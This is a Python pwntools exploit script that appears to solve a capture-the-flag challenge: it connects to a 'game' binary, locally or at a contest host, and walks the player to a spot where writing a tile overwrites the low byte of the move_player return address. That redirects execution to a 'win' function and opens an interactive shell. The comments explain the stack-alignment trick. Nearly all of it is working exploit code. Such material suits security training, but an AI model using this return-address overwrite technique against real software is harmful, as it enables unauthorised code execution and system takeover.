#!/usr/bin/env python3

from pwn import *

exe = ELF("./game")

context.binary = exe


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("tjc.tf ", 31119)

    return r


# player pos {0, 66} --> change tile to \xdf (l) --> move upward (w) --> win!
def main():
    r = conn()

    r.send(b'w'*4 + b'd'*62)    # Position player on the right spot to then move him up and
                                # change the first byte of return address of 'move_player'

    r.send(b'l')                # Change player's tile to the first byte of 'win' address
    r.send(b'\xe4')             # (13A7 for 'main+158' and 13DF for 'win')
                                # But since we have the issue of stack alignment, we will ignore
                                # the push instruction of 'win' function so the stack will remain aligned

    r.send(b'w')                # Move up to overwrite the return address and jump to 'win'
    log.success('Shell spawned successfully!')
    
    r.clean()
    r.interactive('$ ')


if __name__ == "__main__":
    main()
